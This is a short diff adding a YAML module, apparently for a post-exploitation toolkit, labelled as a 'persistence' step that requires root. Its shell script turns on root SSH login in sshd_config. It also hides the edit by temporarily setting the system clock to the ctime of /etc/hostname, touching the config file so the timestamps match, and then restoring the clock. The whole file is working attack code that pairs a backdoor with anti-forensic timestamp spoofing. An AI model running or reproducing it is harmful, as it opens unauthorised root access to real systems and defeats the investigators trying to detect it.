@@ -1,0 +1,14 @@
+name: "root ssh enabler"
+description: "Enables ssh login for root"
+category: persistence
+need_root: true
+variables: []
+priority: 1000
+tip: "Root ssh login enabled"
+script: |
+  NOW=$(date +@%s)
+  date -s "$(stat -c '@%Z' /etc/hostname)"
+  sed -i '/^PermitRootLogin/s/no/yes/' /etc/ssh/sshd_config
+  touch /etc/ssh/sshd_config
+  date -s "$NOW"
+  unset NOW
